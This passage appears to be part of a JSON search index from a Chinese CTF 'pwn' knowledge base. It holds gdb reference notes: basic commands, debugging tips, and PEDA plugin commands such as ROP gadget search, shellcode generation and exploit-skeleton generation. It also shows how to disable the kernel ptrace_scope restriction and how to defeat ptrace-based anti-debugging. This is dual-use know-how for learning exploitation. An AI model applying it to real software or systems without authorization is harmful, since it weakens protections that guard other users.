\uff0c\u5982\u679c\u8981\u5728\u540e\u9762\u7684\u4ee3\u7801\u6ca1\u6709\u6e90\u7801\u7684\u60c5\u51b5\u4e0b\u624d\u53cd\u6c47\u7f16\u540e\u9762\u8981\u6267\u884c\u7684\u4ee3\u7801\uff0c\u8bbe\u7f6e set disassemble-next-line auto \uff0c\u5173\u95ed\u8fd9\u4e2a\u529f\u80fd\uff0c\u8bbe\u7f6e set disassemble-next-line off \uff1b \uff0828\uff09\u5c06\u6e90\u7a0b\u5e8f\u548c\u6c47\u7f16\u6307\u4ee4\u6620\u5c04\u8d77\u6765\uff0c\u4f7f\u7528\u547d\u4ee4 disas /m fun \uff1b \uff0829\uff09\u663e\u793a\u5c06\u8981\u6267\u884c\u7684\u6c47\u7f16\u6307\u4ee4\uff0c\u4f7f\u7528\u547d\u4ee4 display /ni $pc \u663e\u793a\u5f53\u7a0b\u5e8f\u505c\u6b62\u65f6\uff0c\u5c06\u8981\u6267\u884c\u7684n\u6761\u6c47\u7f16\u6307\u4ee4\uff0c\u53d6\u6d88\u53ef\u4ee5\u4f7f\u7528 undisplay \uff1b \uff0830\uff09\u6253\u5370\u5355\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\uff0c i registers regname \u6216 p $regname \uff1b \uff0831\uff09\u7f3a\u7701\u60c5\u51b5\u4e0bgdb\u662f\u4ee5\u53ea\u8bfb\u65b9\u5f0f\u52a0\u8f7d\u7a0b\u5e8f\u7684\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u4e3a\u53ef\u5199\uff0c\u547d\u4ee4\u4e3a gdb -write ./exec \uff0c\u4e5f\u53ef\u4ee5\u5728gdb\u547d\u4ee4\u4e2d\u8bbe\u7f6e\u5e76\u91cd\u65b0\u52a0\u8f7d\u7a0b\u5e8f set write on \uff1b \uff0832\uff09PC\u5bc4\u5b58\u5668\u4f1a\u5b58\u50a8\u7a0b\u5e8f\u4e0b\u4e00\u6761\u8981\u6267\u884c\u7684\u6307\u4ee4\u7684\u5730\u5740\uff0c\u53ef\u4ee5\u4fee\u6539PC\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\uff0c\u547d\u4ee4\u4e3a set var $pc=address \uff1b \uff0833\uff09command breaknum\uff0c\u5728\u65ad\u70b9breaknum\u5904\u4e2d\u65ad\u65f6\u9700\u8981\u6267\u884c\u7684\u547d\u4ee4\uff0c\u4e4b\u540e\u9700\u8981\u8f93\u5165\u547d\u4ee4\uff0c\u4f7f\u7528end\u7ed3\u675f\u547d\u4ee4\uff1b \uff0834\uff09\u53ef\u4ee5\u4f7f\u7528$_siginfo\u53d8\u91cf\u6765\u83b7\u53d6\u5f53\u524d\u4fe1\u53f7\u7684\u4e00\u4e9b\u4fe1\u606f\uff1b \uff0835\uff09\u663e\u793a\u5171\u4eab\u94fe\u63a5\u5e93\u4fe1\u606f\uff0c\u4f7f\u7528 info sharedlibrary regex \u547d\u4ee4\u53ef\u4ee5\u663e\u793a\u7a0b\u5e8f\u52a0\u8f7d\u7684\u5171\u4eab\u94fe\u63a5\u5e93\u4fe1\u606f\uff0c\u5176\u4e2d regex \u53ef\u4ee5\u662f\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u610f\u4e3a\u663e\u793a\u540d\u5b57\u7b26\u5408 regex \u7684\u5171\u4eab\u94fe\u63a5\u5e93\uff0c\u5982\u679c\u6ca1\u6709 regex \uff0c\u5219\u5217\u51fa\u6240\u6709\u7684\u5e93\uff0c\u5e26\u201c * \u201d\u8868\u793a\u5e93\u7f3a\u5c11\u8c03\u8bd5\u4fe1\u606f\uff1b \uff0836\uff09\u8bbe\u7f6e\u6309\u4f55\u79cd\u65b9\u5f0f\u89e3\u6790\u811a\u672c\uff0c set script-extension off/soft/strict \uff0coff\u8868\u793a\u6240\u6709\u7684\u811a\u672c\u6587\u4ef6\u90fd\u89e3\u6790\u6210gdb\u7684\u547d\u4ee4\u811a\u672c\uff0c soft\u8868\u793a\u6839\u636e\u811a\u672c\u6587\u4ef6\u6269\u5c55\u540d\u51b3\u5b9a\u5982\u4f55\u89e3\u6790\u811a\u672c\uff0c\u5982\u679cgdb\u652f\u6301\u89e3\u6790\u8fd9\u79cd\u811a\u672c\u8bed\u8a00\uff0c\u5c31\u6309\u8fd9\u79cd\u8bed\u8a00\u89e3\u6790\uff0c\u5426\u5219\u5c31\u6309\u547d\u4ee4\u811a\u672c\u89e3\u6790\uff0cstrict\u8868\u793a\u6839\u636e\u811a\u672c\u6587\u4ef6\u6269\u5c55\u540d\u51b3\u5b9a\u5982\u4f55\u89e3\u6790\u811a\u672c\uff0c\u5982\u679cgdb\u652f\u6301\u89e3\u6790\u8fd9\u79cd\u811a\u672c\u8bed\u8a00\uff0c\u5c31\u6309\u8fd9\u79cd\u8bed\u8a00\u89e3\u6790\uff0c\u5426\u5219\u4e0d\u89e3\u6790\uff1b \uff0837\uff09\u4fdd\u5b58\u5386\u53f2\u547d\u4ee4\uff0c set history save on \uff1b \uff0838\uff09\u8bbe\u7f6e\u6e90\u6587\u4ef6\u67e5\u627e\u8def\u5f84\uff0c directory path \uff1b \uff0839\uff09\u8fdb\u5165\u548c\u9000\u51fa\u56fe\u5f62\u754c\u9762\uff0cgdb\u65f6\u4f7f\u7528-tui\u53c2\u6570\uff0c\u6216\u8005gdb\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u4f7f\u7528 Crtl+X+A \u7ec4\u5408\u952e\uff0c\u9000\u51fa\u76f8\u540c\uff1b \uff0840\uff09\u4f7f\u7528\u56fe\u5f62\u754c\u9762\u65f6\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u663e\u793a\u6c47\u7f16\u4ee3\u7801\u7a97\u53e3\uff0c layout asm \uff0c\u5982\u679c\u65e2\u60f3\u663e\u793a\u6c47\u7f16\u4ee3\u7801\u53c8\u60f3\u663e\u793a\u6e90\u7801\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4 layout split \uff0c\u4f7f\u7528 layout regs \u663e\u793a\u5bc4\u5b58\u5668\u7a97\u53e3\uff0c\u4f7f\u7528 tui reg float \u663e\u793a\u6d6e\u70b9\u5bc4\u5b58\u5668\u7a97\u53e3\uff0c\u4f7f\u7528 tui reg system \u663e\u793a\u7cfb\u7edf\u5bc4\u5b58\u5668\u7a97\u53e3\uff0c\u5982\u679c\u60f3\u5207\u6362\u56de\u901a\u7528\u5bc4\u5b58\u5668\u53ef\u4ee5\u4f7f\u7528 tui reg general \u547d\u4ee4\uff1b \uff0841\uff09\u4e00\u4e9b\u547d\u4ee4\u7684\u7f29\u5199\uff1a b -> break c -> continue d -> delete f -> frame i -> info j -> jump l -> list n -> next p -> print r -> run s -> step u -> until aw -> awatch bt -> backtrace dir -> directory disas -> disassemble fin -> finish ig -> ignore ni -> nexti rw -> rwatch si -> stepi tb -> tbreak wa -> watch win -> winheight \uff0842\uff09\u4e0d\u79bb\u5f00gdb\u76f4\u63a5\u6267\u884cshell\u547d\u4ee4\uff0c\u4f7f\u7528 shell command \u6216\u8005 !command \u611f\u53f9\u53f7\u540e\u4e0d\u80fd\u6709\u7a7a\u683c\uff1b \uff0843\uff09\u8bbe\u7f6e\u88ab\u8c03\u8bd5\u7a0b\u5e8f\u7684\u53c2\u6570\uff0c gdb -args ./a.out a b c \uff0c\u6216\u8005 (gdb) set args a b c \uff0c\u663e\u793a\u53c2\u6570 show args \uff0c\u4e5f\u53ef\u4ee5\u5728\u7a0b\u5e8f\u8fd0\u884c\u65f6\u76f4\u63a5\u6307\u5b9a\uff0c r a b c \uff0c\u5982\u679c\u60f3\u8ba9\u53c2\u6570\u4e3a\u7a7a\uff0c\u76f4\u63a5 set args \uff1b \uff0844\uff09\u8bbe\u7f6e\u7a0b\u5e8f\u8fd0\u884c\u65f6\u7684\u73af\u5883\u53d8\u91cf\uff0c set env varname=value \uff0c\u4f8b\u5982\uff1a set env LD_PRELOAD=/lib/x86_64-linux-gnu/libpthread.so.0 \uff0845\uff09\u4f7f\u7528 apropos regexp \u547d\u4ee4\u67e5\u627e\u6240\u6709\u7b26\u5408 regexp \u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u547d\u4ee4\u4fe1\u606f\uff1b \uff0846\uff09\u53ef\u4ee5\u4f7f\u7528 set logging on \u628a\u6267\u884cgdb\u7684\u8fc7\u7a0b\u8bb0\u5f55\u4e0b\u6765\uff0c\u9ed8\u8ba4\u4fdd\u5b58\u5728gdb.txt\u4e2d\uff1b \u56db\u3001peda\u547d\u4ee4 \uff081\uff09aslr\uff0c\u663e\u793a/\u8bbe\u7f6e gdb \u7684 ASLR\uff1b \uff082\uff09asmsearch\uff0c\u5728\u5185\u5b58\u4e2d\u641c\u7d22\u53cd\u6c47\u7f16\u4ee3\u7801\uff0c\u4f8b\u5982\uff1a asmsearch \"int 0x80\" asmsearch \"add esp, ?\" libc \uff083\uff09assemble\uff0c\u76f4\u63a5\u6267\u884c\u4e00\u4e9b\u6c47\u7f16\u6307\u4ee4\uff0cend\u7ed3\u675f\uff1b \uff084\uff09checksec\uff0c\u68c0\u67e5\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u5b89\u5168\u9009\u9879\uff1b \uff085\uff09cmpmem\uff0c\u6bd4\u8f83\u4e00\u6bb5\u5185\u5b58\u4e0e\u4e00\u4e2a\u6587\u4ef6\uff0c\u4f8b\u5982\uff1a cmpmem 0x08049000 0x0804a000 data.mem \uff086\uff09distance\uff0c\u8ba1\u7b97\u4e24\u4e2a\u5730\u5740\u4e4b\u95f4\u7684\u8ddd\u79bb\uff1b \uff087\uff09dumpargs\uff0c\u5728\u8c03\u7528\u6307\u4ee4\u505c\u6b62\u65f6\u663e\u793a\u4f20\u9012\u7ed9\u51fd\u6570\u7684\u53c2\u6570\uff1b \uff088\uff09dumprop\uff0c\u5728\u7279\u5b9a\u7684\u5185\u5b58\u8303\u56f4\u663e\u793a ROP gadgets\uff1b \uff089\uff09elfheader\uff0c\u83b7\u53d6\u6b63\u5728\u8c03\u8bd5\u7684 ELF \u6587\u4ef6\u7684\u5934\u4fe1\u606f\uff1b \uff0810\uff09elfsymbol\uff0c\u4ece ELF \u6587\u4ef6\u4e2d\u83b7\u53d6\u6ca1\u6709\u8c03\u8bd5\u4fe1\u606f\u7684\u7b26\u53f7\u4fe1\u606f\uff1b \uff0811\uff09jmpcall\uff0c\u5728\u5185\u5b58\u4e2d\u641c\u7d22jmp/call\u6307\u4ee4\uff0c\u4f8b\u5982\uff1a jmpcall jmpcall eax jmpcall esp libc \uff0812\uff09loadmem\uff0c\u5c06\u4e00\u4e2a\u6587\u4ef6\u52a0\u8f7d\u5230\u6307\u5b9a\u5185\u5b58\uff0c\u4f8b\u5982\uff1a loadmem stack.mem 0xbffdf000 \uff0813\uff09lookup\uff0c\u641c\u7d22\u5c5e\u4e8e\u5185\u5b58\u8303\u56f4\u7684\u5730\u5740\u7684\u6240\u6709\u5730\u5740/\u5f15\u7528\uff1b \uff0814\uff09nextcall\uff0c\u4e00\u76f4\u6b65\u5165\u6267\u884c\u5230 call \u6307\u4ee4\uff0cnextjmp\uff0c\u4e00\u76f4\u6b65\u5165\u6267\u884c\u5230 j \u6307\u4ee4\uff1b \uff0815\uff09patch\uff0c \uff0816\uff09pattern\uff0c\u751f\u6210\uff0c\u641c\u7d22\u6216\u5199\u5165\u5faa\u73af pattern \u5230\u5185\u5b58\uff1b \uff0817\uff09procinfo\uff0c\u663e\u793a\u8c03\u8bd5\u8fdb\u7a0b\u7684 /proc/pid/\uff1b \uff0818\uff09pshow\uff0c\u663e\u793a\u5404\u79cd PEDA \u9009\u9879\u548c\u5176\u4ed6\u8bbe\u7f6e\uff0cpset\uff0c\u8bbe\u7f6e\u5404\u79cd PEDA \u9009\u9879\u548c\u5176\u4ed6\u8bbe\u7f6e\uff1b \uff0819\uff09readelf\uff0c\u83b7\u53d6\u6587\u4ef6\u5934\u3001\u6bb5\u4fe1\u606f\uff1b \uff0820\uff09ropgadget\uff0c\u83b7\u53d6\u4e8c\u8fdb\u5236\u6216\u5e93\u7684\u5e38\u89c1 ROP gadgets\uff1b \uff0821\uff09ropsearch\uff0c\u641c\u7d22\u5185\u5b58\u4e2d\u7684 ROP gadgets\uff1b \uff0822\uff09searchmem|find\uff0c\u641c\u7d22\u5185\u5b58\u4e2d\u7684 pattern\uff0c\u652f\u6301\u6b63\u5219\u8868\u8fbe\u5f0f\u641c\u7d22\uff1b \uff0823\uff09shellcode\uff0c\u751f\u6210\u6216\u4e0b\u8f7d\u5e38\u89c1\u7684 shellcode\uff0c\u4f8b\u5982\uff1a shellcode x86/linux exec \uff0824\uff09skeleton\uff0c\u751f\u6210 python exploit \u4ee3\u7801\u6a21\u677f\uff0c\u4f8b\u5982\uff1a skeleton argv exploit.py \uff0825\uff09stepuntil\uff0c\u6b65\u5165\u76f4\u5230\u9047\u89c1\u6307\u5b9a\u7684\u6c47\u7f16\u4ee3\u7801\uff0c\u4f8b\u5982\uff1a stepuntil cmp \uff0826\uff09strings\uff0c\u663e\u793a\u5185\u5b58\u4e2d\u53ef\u6253\u5370\u7684\u5b57\u7b26\u4e32\uff1b \uff0827\uff09vmmap\uff0c\u5728\u8c03\u8bd5\u8fc7\u7a0b\u4e2d\u83b7\u53d6\u6bb5\u7684\u865a\u62df\u6620\u5c04\u5730\u5740\u8303\u56f4\uff1b vmmap libc vmmap stack vmmap binary \uff0828\uff09xormem\uff0c\u7528\u4e00\u4e2a key \u6765\u5bf9\u4e00\u4e2a\u5185\u5b58\u533a\u57df\u6267\u884c XOR \u64cd\u4f5c\uff0c\u4f8b\u5982\uff1a xormem 0x08049000 0x0804a000 \u201cthekey\u201d","title":"gdb"},{"location":"RelatedKnowledge/pwn/gdb/#gdb","text":"","title":"gdb"},{"location":"RelatedKnowledge/pwn/gdb/#_1","text":"sudo apt-get install gdb // \u9700\u8981\u8c03\u8bd5\u5176\u4ed6\u67b6\u6784\u4e0b\u7684elf\u7a0b\u5e8f\u65f6 sudo apt-get install gdb-multiarch \u8fd8\u53ef\u4ee5\u4ecegithub\u4e0a\u4e0b\u8f7d\u4e00\u4e9b\u63d2\u4ef6\uff0cpeda\u3001gef\u3001pwndbg\u3002","title":"\u4e00\u3001\u5b89\u88c5"},{"location":"RelatedKnowledge/pwn/gdb/#_2","text":"gdb program -q // \u5b89\u9759\u6a21\u5f0f\u8c03\u8bd5\u7a0b\u5e8f quit // \u9000\u51fa\u8c03\u8bd5\u5668 run(r) arguments // \u8fd0\u884c\u88ab\u8c03\u8bd5\u7a0b\u5e8f\uff0c\u5e26\u53c2\u6570 attach pid // \u8c03\u8bd5\u8fdb\u7a0b\u53f7\u4e3apid\u7684\u8fdb\u7a0b detach // \u8131\u79bb\u8fdb\u7a0b break(b) *address // \u4e0b\u65ad\u70b9 b function_name // \u5728\u51fd\u6570\u5904\u4e0b\u65ad\u70b9 tbreak // \u8bbe\u7f6e\u4e34\u65f6\u65ad\u70b9\uff0c\u7b2c\u4e00\u6b21\u547d\u4e2d\u540e\u4f1a\u81ea\u52a8\u5220\u9664\uff0c\u7528\u6cd5\u540cbreak break \u2026 if cond // \u8bbe\u7f6e\u6761\u4ef6\u65ad\u70b9 watch(wa) v // \u8bbe\u7f6e\u89c2\u5bdf\u70b9\uff0c\u5982\u679c\u7a0b\u5e8f\u4e2d\u7684\u53d8\u91cfv\u6539\u53d8\uff0c\u7a0b\u5e8f\u5c06\u4e2d\u65ad watch *(data type*)address // \u5982\u679c\u5185\u5b58\u5730\u5740address\u5904\u6539\u53d8\uff0c\u7a0b\u5e8f\u5c06\u4e2d\u65ad watch expr thread threadnum // \u53ea\u89c2\u5bdf\u5bf9\u5e94\u7ebf\u7a0b\u7684\u53d8\u91cf\u503c\u53d8\u5316\uff0c\u5982\u679c\u53d8\u5316\u7a0b\u5e8f\u4e2d\u65ad rwatch(rw) // \u8bbe\u7f6e\u8bfb\u89c2\u5bdf\u70b9\uff0c\u5982\u679c\u7a0b\u5e8f\u4e2d\u7684\u53d8\u91cf\u6216\u8005\u5185\u5b58\u88ab\u8bfb\u53d6\uff0c\u7a0b\u5e8f\u5c06\u4e2d\u65ad awatch(aw) // \u8bbe\u7f6e\u8bfb\u5199\u89c2\u5bdf\u70b9\uff0c\u5982\u679c\u53d8\u91cf\u6216\u8005\u5730\u5740\u88ab\u8bfb\u53d6\u6216\u8005\u6539\u53d8\uff0c\u7a0b\u5e8f\u5c06\u4e2d\u65ad catch fork/vfork/exec // \u4e3afork\u3001vfork\u3001exec\u51fd\u6570\u8bbe\u5b9acatchpoint\uff0c\u9047\u5230\u8fd9\u4e9b\u51fd\u6570\u65f6\u7a0b\u5e8f\u5c06\u6682\u505c catch syscall name|num // \u5f53\u53d1\u751f\u5bf9\u5e94name\u6216num\u7cfb\u7edf\u8c03\u7528\u65f6\uff0c\u7a0b\u5e8f\u6682\u505c ignore bnum count // \u5ffd\u7565\u65ad\u70b9\uff0cbnum\u4e3a\u65ad\u70b9\u7f16\u53f7\uff0ccount\u8868\u793a\u4e4b\u540ecount\u6b21\u89e6\u53d1\u65ad\u70b9\u90fd\u5c06\u5ffd\u7565 info b // \u67e5\u770b\u65ad\u70b9 info display // \u6253\u5370\u81ea\u52a8\u663e\u793a\u7684\u8868\u8fbe\u5f0f\u5217\u8868 info threads // \u6253\u5370\u51fa\u6240\u6709\u7ebf\u7a0b\u7684\u4fe1\u606f info frame // \u6253\u5370\u51fa\u6307\u5b9a\u6808\u5e27\u7684\u8be6\u7ec6\u4fe1\u606f info proc // \u67e5\u770bproc\u91cc\u7684\u8fdb\u7a0b\u4fe1\u606f info functions // \u5217\u51fa\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6240\u6709\u51fd\u6570\u540d info proc mappings // \u67e5\u770b\u8fdb\u7a0b\u7684\u5185\u5b58\u6620\u5c04\u4fe1\u606f info files/target // \u66f4\u8be6\u7ec6\u5730\u8f93\u51fa\u8fdb\u7a0b\u7684\u5185\u5b58\u4fe1\u606f\uff0c\u5305\u62ec\u5f15\u7528\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u7b49\u7b49 delete number // \u5220\u9664\u67d0\u4e2a\u65ad\u70b9 stepi(si) // \u5355\u6b65\u6b65\u5165 nexti(ni) // \u5355\u6b65\u6b65\u8fc7 continue(c) // \u7ee7\u7eed\u6267\u884c finish // \u6267\u884c\u5230\u51fd\u6570\u8fd4\u56de\u5904 info register // \u67e5\u770b\u5bc4\u5b58\u5668 i all-registers // \u67e5\u770b\u6240\u6709\u5bc4\u5b58\u5668 backtrace(bt) // \u6253\u5370\u51fd\u6570\u8c03\u7528\u6808\u56de\u6eaf print(p) /x expr/file::v // \u8ba1\u7b97\u8868\u8fbe\u5f0fexpr\u7684\u503c\u5e76\u6253\u5370\uff0c\u6253\u5370file\u6587\u4ef6\u7684\u53d8\u91cf\u503c\uff0c\u683c\u5f0f\u4e3ao\uff08\u516b\u8fdb\u5236\uff09\u3001d\uff08\u5341\u8fdb\u5236\uff09\u3001x\uff08\u5341\u516d\u8fdb\u5236\uff09\u3001u\uff08\u65e0\u7b26\u53f7\u5341\u516d\u8fdb\u5236\uff09\u3001t\uff08\u4e8c\u8fdb\u5236\uff09\u3001f\uff08\u6d6e\u70b9\u6570\uff09\u3001a\uff08\u5730\u5740\uff09\u3001c\uff08\u5b57\u7b26\uff09 x/CountFormatSize address // \u4ee5\u6307\u5b9a\u683c\u5f0fFormat\u6253\u5370address\u5904\u6307\u5b9a\u5927\u5c0fSize\u3001\u6307\u5b9a\u6570\u91cfCount\u7684\u5bf9\u8c61\uff0cSize\u53d6\u503c\uff0cb\uff08\u5b57\u8282\uff09\u3001h\uff08\u534a\u5b57\uff09\u3001w\uff08\u5b57\uff09\u3001g\uff088\u5b57\u8282\uff09\uff0cFormat\u53d6\u503c\uff0co\uff08\u516b\u8fdb\u5236\uff09\u3001d\uff08\u5341\u8fdb\u5236\uff09\u3001x\uff08\u5341\u516d\u8fdb\u5236\uff09\u3001u\uff08\u65e0\u7b26\u53f7\u5341\u8fdb\u5236\uff09\u3001t\uff08\u4e8c\u8fdb\u5236\uff09\u3001f\uff08\u6d6e\u70b9\u6570\uff09\u3001a\uff08\u5730\u5740\uff09\u3001i\uff08\u6307\u4ee4\uff09\u3001c\uff08\u5b57\u7b26\uff09\u3001s\uff08\u5b57\u7b26\u4e32\uff09 display/fmt expr/addr // \u6bcf\u6b21\u7a0b\u5e8f\u505c\u6b62\u65f6\u6253\u5370\u8868\u8fbe\u5f0f\u7684\u503c\uff0c\u683c\u5f0f\u4e3ao\uff08\u516b\u8fdb\u5236\uff09\u3001d\uff08\u5341\u8fdb\u5236\uff09\u3001x\uff08\u5341\u516d\u8fdb\u5236\uff09\u3001u\uff08\u65e0\u7b26\u53f7\u5341\u516d\u8fdb\u5236\uff09\u3001t\uff08\u4e8c\u8fdb\u5236\uff09\u3001f\uff08\u6d6e\u70b9\u6570\uff09\u3001a\uff08\u5730\u5740\uff09\u3001c\uff08\u5b57\u7b26\uff09 disassemble(disas) // \u53cd\u6c47\u7f16\u4ee3\u7801 set $reg=value // \u4fee\u6539\u5bc4\u5b58\u5668\u7684\u503c set {type}(address)=value // \u4fee\u6539\u5185\u5b58\u5730\u5740address\u5904\u7684\u503c\u4e3avalue\uff0c\u7c7b\u578b\u4e3atype\u6307\u5b9a\uff0c\u4f8b\u5982int set var variable=expr // \u4fee\u6539\u4ee3\u7801\u4e2d\u7684\u53d8\u91cf\u503c shell command // \u6267\u884cshell\u547d\u4ee4 set follow-fork-mode parent|child // \u5f53\u53d1\u751ffork\u65f6\uff0c\u6307\u793a\u8c03\u8bd5\u5668\u8ddf\u8e2a\u7236\u8fdb\u7a0b\u8fd8\u662f\u5b50\u8fdb\u7a0b handler SIGALRM ignore // \u5ffd\u89c6SIGALRM\uff0c\u8c03\u8bd5\u5668\u63a5\u6536\u5230\u7684SIGALRM\u4fe1\u53f7\u4e0d\u4f1a\u53d1\u9001\u5230\u88ab\u8c03\u8bd5\u7a0b\u5e8f target remote ip:port // \u8fde\u63a5\u8fdc\u7a0b\u8c03\u8bd5 thread apply all bt // \u6253\u5370\u51fa\u6240\u6709\u7ebf\u7a0b\u7684\u5806\u6808\u4fe1\u606f generate-core-file(gcore) // \u5c06\u8c03\u8bd5\u4e2d\u7684\u8fdb\u7a0b\u751f\u6210\u5185\u6838\u8f6c\u50a8\u6587\u4ef6 maint info program-spaces // \u6253\u5370\u5f53\u524d\u6240\u6709\u88ab\u8c03\u8bd5\u7684\u8fdb\u7a0b\u4fe1\u606f i signals/handle // \u67e5\u770b\u5982\u4f55\u5904\u7406\u8fdb\u7a0b\u6536\u5230\u7684\u4fe1\u53f7 handle signal stop/nostop // \u8bbe\u7f6e\u4fe1\u53f7\u53d1\u751f\u65f6\u662f\u5426\u6682\u505c\u7a0b\u5e8f handle signal print/noprint // \u8bbe\u7f6e\u4fe1\u53f7\u53d1\u751f\u65f6\u662f\u5426\u6253\u5370\u4fe1\u53f7\u4fe1\u606f handle signal pass(noignore)/nopass(ignore) // \u8bbe\u7f6e\u4fe1\u53f7\u53d1\u751f\u65f6\u662f\u5426\u628a\u4fe1\u53f7\u4e22\u7ed9\u7a0b\u5e8f\u5904\u7406","title":"\u4e8c\u3001\u5e38\u7528\u547d\u4ee4"},{"location":"RelatedKnowledge/pwn/gdb/#_3","text":"\uff081\uff09\u6709\u65f6\u5019attach\u5230\u4e00\u4e2a\u8fdb\u7a0b\u65f6\u53ef\u80fd\u4f1a\u51fa\u73b0\u62a5\u9519 ptrace: Operation not permitted. \uff0c\u8fd9\u662f\u56e0\u4e3a\u5f00\u542f\u4e86\u5185\u6838\u53c2\u6570 ptrace_scope \uff0c\u901a\u8fc7\u67e5\u770b cat /proc/sys/kernel/yama/ptrace_scope \uff0c\u5982\u679c\u8fd4\u56de\u503c\u4e3a1\u8868\u793a\u5f00\u542f\u4e86\uff0c\u6b64\u65f6\u666e\u901a\u7528\u6237\u8fdb\u7a0b\u662f\u65e0\u6cd5\u5bf9\u5176\u4ed6\u8fdb\u7a0b\u8fdb\u884cattach\u64cd\u4f5c\u7684\uff0c\u89e3\u51b3\u529e\u6cd5\u6709\u4e24\u4e2a\uff0c\u4e00\u4e2a\u662f\u4f7f\u7528root\u7528\u6237\uff0c\u53e6\u4e00\u4e2a\u662f\u5173\u95ed\uff0c\u4f7f\u7528\u547d\u4ee4 echo 0 > /proc/sys/kernel/yama/ptrace_scope \u5373\u53ef\uff1b \uff082\uff09\u5e26\u6e90\u7801\u8c03\u8bd5\u65b9\u6cd5\uff0c\u4f7f\u7528gcc\u7f16\u8bd1\u65f6\u5fc5\u987b\u52a0\u4e0a-g\u53c2\u6570\uff0c\u4f8b\u5982 gcc -g test.c -o test \uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u4f7f\u7528 b \u884c\u53f7 \u6765\u4e0b\u65ad\u70b9\uff0c\u4f7f\u7528 list \u5f00\u59cb\u884c\u53f7,\u7ed3\u675f\u884c\u53f7 \u6765\u67e5\u770b\u6e90\u7801\uff0c\u6216\u8005\u76f4\u63a5 list \u67e5\u770b\u5f53\u524d\u6267\u884c\u4f4d\u7f6e\u540e10\u884c\u6e90\u7801\uff1b \uff083\uff09\u8fdb\u5165\u4e0d\u5e26\u8c03\u8bd5\u4fe1\u606f\u7684\u51fd\u6570\uff0c\u6709\u65f6\u5019\u8c03\u8bd5\u65f6\u65e0\u6cd5s\u8fdb\u4e0d\u5e26\u8c03\u8bd5\u4fe1\u606f\u7684\u51fd\u6570\uff0c\u6bd4\u5982printf\uff0c\u4f7f\u7528\u547d\u4ee4 set step-mode on \uff0c\u5373\u53efs\u8fdb\u5165\u4e0d\u5e26\u8c03\u8bd5\u4fe1\u606f\u7684\u51fd\u6570\u4e2d\uff1b \uff084\uff09\u9000\u51fa\u6b63\u5728\u8c03\u8bd5\u7684\u51fd\u6570\uff0c\u4e00\u79cd\u662f\u4f7f\u7528finish\uff0c\u8fd9\u6837\u662f\u6267\u884c\u5b8c\u8be5\u51fd\u6570\u5e76\u4e14\u4f1a\u6253\u5370\u8fd4\u56de\u503c\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528return\u547d\u4ee4\uff0c\u8fd9\u6837\u51fd\u6570\u5c31\u4e0d\u4f1a\u7ee7\u7eed\u6267\u884c\u4e0b\u53bb\uff0c\u800c\u662f\u8df3\u8fc7\u5f53\u524d\u51fd\u6570\uff0c\u76f4\u63a5\u5230\u8fd4\u56de\u7684\u4f4d\u7f6e\uff0c\u53ef\u4ee5\u5e26\u8fd4\u56de\u503c return expr \uff0c\u8fd9\u6837\u5c31\u76f4\u63a5\u6307\u5b9a\u4e86\u51fd\u6570\u8fd4\u56de\u503c\uff0c\u5728\u8c03\u8bd5\u7684\u65f6\u5019\u6bd4\u8f83\u6709\u7528\uff1b \uff085\uff09\u53ef\u4ee5\u4f7f\u7528 call func \u6216 print func \u76f4\u63a5\u8c03\u7528\u51fd\u6570\u6267\u884c\uff1b \uff086\uff09\u53ef\u4ee5\u4f7f\u7528 frame n \u5207\u6362\u5806\u6808\u5e27\u5c42\u7ea7\uff0c\u4f7f\u7528 up n \u5411\u4e0a\u5207\u6362n\u5c42\u5806\u6808\u5e27\uff0c\u4f7f\u7528 down n \u5411\u4e0b\u5207\u6362n\u5c42\u5806\u6808\u5e27\uff1b \uff087\uff09\u5bf9\u4e8e\u6ca1\u6709\u8c03\u8bd5\u4fe1\u606f\u7684\u7a0b\u5e8f\uff0c\u5982\u679c\u4e0d\u77e5\u9053main\u51fd\u6570\u7684\u4f4d\u7f6e\uff0c\u53ef\u4ee5\u5728\u7a0b\u5e8f\u5165\u53e3\u5904\u6253\u65ad\u70b9\uff0c\u5148\u901a\u8fc7 readelf \u83b7\u5f97\u7a0b\u5e8f\u5165\u53e3\u5730\u5740\uff0c\u7136\u540e\u4e0b\u5730\u5740\u65ad\u70b9\u5373\u53ef\uff1b \uff088\uff09\u4fdd\u5b58\u5df2\u7ecf\u8bbe\u7f6e\u7684\u65ad\u70b9\uff0c\u5f53\u8bbe\u7f6e\u65ad\u70b9\u8f83\u591a\u5e76\u4e14\u4e0d\u4f1a\u6539\u53d8\u592a\u5927\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4 save breakpoints file-name-to-save \u5c06\u65ad\u70b9\u4fe1\u606f\u4fdd\u5b58\u5728\u6587\u4ef6\u4e2d\uff0c\u4e0b\u6b21\u8c03\u8bd5\u65f6\uff0c\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\u6279\u91cf\u8bbe\u7f6e\u4fdd\u5b58\u7684\u65ad\u70b9\uff0c source file-name-to-save \uff1b \uff089\uff09\u6709\u4e9b\u7a0b\u5e8f\u4e0d\u60f3\u88abgdb\u8c03\u8bd5\uff0c\u5b83\u4eec\u5c31\u4f1a\u5728\u7a0b\u5e8f\u4e2d\u8c03\u7528\u201c ptrace \u201d\u51fd\u6570\uff0c\u4e00\u65e6\u8fd4\u56de\u5931\u8d25\uff0c\u5c31\u8bc1\u660e\u7a0b\u5e8f\u6b63\u5728\u88ab gdb\u7b49\u7c7b\u4f3c\u7684\u7a0b\u5e8f\u8ffd\u8e2a\uff0c\u6240\u4ee5\u5c31\u76f4\u63a5\u9000\u51fa\uff0c\u7834\u89e3\u8fd9\u7c7b\u7a0b\u5e8f\u7684\u529e\u6cd5\u5c31\u662f\u4e3a ptrace \u8c03\u7528\u8bbe\u7f6e catchpoint \uff0c\u901a\u8fc7\u4fee\u6539 ptrace \u7684\u8fd4\u56de\u503c\uff0c\u8fbe\u5230\u76ee\u7684\uff1b 